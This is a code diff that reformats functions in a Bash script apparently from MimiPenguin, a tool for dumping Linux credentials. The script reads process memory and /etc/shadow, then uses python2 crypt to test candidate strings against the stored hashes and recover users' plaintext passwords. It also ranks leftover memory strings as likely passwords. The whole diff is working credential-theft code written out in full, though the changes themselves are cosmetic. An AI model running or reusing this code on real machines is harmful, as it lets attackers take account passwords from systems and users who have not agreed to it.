@@ -14,8 +14,10 @@ fi
 #Store results to cleanup later
 export RESULTS=""
 
-dump_pid ()
-{
+
+# $1 = PID, $2 = output_file, $3 = operating system
+function dump_pid () {
+
 	system=$3
 	pid=$1
 	output_file=$2
@@ -35,67 +37,69 @@ dump_pid ()
 	done <<< "$mem_maps"
 }
 
-parse_pass ()
-{
-#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
 
-#If hash not in dump get shadow hashes
-if [[ ! "$2" ]]; then
-		SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
-fi
 
-#Determine password potential for each word
-while read -r line; do
-	#If hash in dump, prepare crypt line
-	if [[ "$2" ]]; then
-		#get ctype
-		CTYPE="$(echo "$2" | cut -c-3)"
-		#Escape quotes, backslashes, single quotes to pass into crypt
-		SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
-		CRYPT="\"$SAFE\", \"$CTYPE$3\""
-		if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then
-			#Find which user's password it is (useful if used more than once!)
-			USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
-			export RESULTS="$RESULTS$4			$USER:$line \n"
-		fi
-	#Else use shadow hashes
-	elif [[ $SHADOWHASHES ]]; then
-		while read -r thishash; do
-			CTYPE="$(echo "$thishash" | cut -c-3)"
-			SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
+# $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
+function parse_pass () {
+
+	#If hash not in dump get shadow hashes
+	if [[ ! "$2" ]]; then
+			SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | egrep '^\$.\$')"
+	fi
+
+	#Determine password potential for each word
+	while read -r line; do
+		#If hash in dump, prepare crypt line
+		if [[ "$2" ]]; then
+			#get ctype
+			CTYPE="$(echo "$2" | cut -c-3)"
 			#Escape quotes, backslashes, single quotes to pass into crypt
 			SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
-			CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
-			if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
+			CRYPT="\"$SAFE\", \"$CTYPE$3\""
+			if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$2" ]]; then
 				#Find which user's password it is (useful if used more than once!)
-				USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
-				export RESULTS="$RESULTS$4			$USER:$line\n"
+				USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
+				export RESULTS="$RESULTS$4			$USER:$line \n"
 			fi
-		done <<< "$SHADOWHASHES"
-	#if no hash data - revert to checking probability
-	else
-    patterns=("^_pammodutil.+[0-9]$"\
-             "^LOGNAME="\
-             "UTF-8"\
-             "^splayManager[0-9]$"\
-             "^gkr_system_authtok$"\
-             "[0-9]{1,4}:[0-9]{1,4}:"\
-             "Manager\.Worker"\
-             "/usr/share"\
-             "/bin"\
-             "\.so\.[0-1]$"\
-             "x86_64"\
-             "(aoao)"\
-             "stuv")
-    export RESULTS="$RESULTS[HIGH]$4			$line\n"
-    for pattern in $patterns;do
-      if [[ $line =~ $pattern ]]; then
-        export RESULTS="$RESULTS[LOW]$4			$line\n"
-      fi
-    done
-	fi
-done <<< "$1"
-}
+		#Else use shadow hashes
+		elif [[ $SHADOWHASHES ]]; then
+			while read -r thishash; do
+				CTYPE="$(echo "$thishash" | cut -c-3)"
+				SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
+				#Escape quotes, backslashes, single quotes to pass into crypt
+				SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
+				CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
+				if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
+					#Find which user's password it is (useful if used more than once!)
+					USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
+					export RESULTS="$RESULTS$4			$USER:$line\n"
+				fi
+			done <<< "$SHADOWHASHES"
+		#if no hash data - revert to checking probability
+		else
+	    patterns=("^_pammodutil.+[0-9]$"\
+	             "^LOGNAME="\
+	             "UTF-8"\
+	             "^splayManager[0-9]$"\
+	             "^gkr_system_authtok$"\
+	             "[0-9]{1,4}:[0-9]{1,4}:"\
+	             "Manager\.Worker"\
+	             "/usr/share"\
+	             "/bin"\
+	             "\.so\.[0-1]$"\
+	             "x86_64"\
+	             "(aoao)"\
+	             "stuv")
+	    export RESULTS="$RESULTS[HIGH]$4			$line\n"
+	    for pattern in $patterns;do
+	      if [[ $line =~ $pattern ]]; then
+	        export RESULTS="$RESULTS[LOW]$4			$line\n"
+	      fi
+	    done
+		fi
+	done <<< "$1"
+} # end parse_pass
+
 
 #Support Kali
 if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
@@ -213,6 +217,7 @@ if [[ -e "/etc/ssh/sshd_config" ]]; then
 		rm -rf /tmp/sshd.*
 	fi
 fi
+
 #Output results to STDOUT
 printf "MimiPenguin Results:\n"
 printf "%b" "$RESULTS" | sort -u
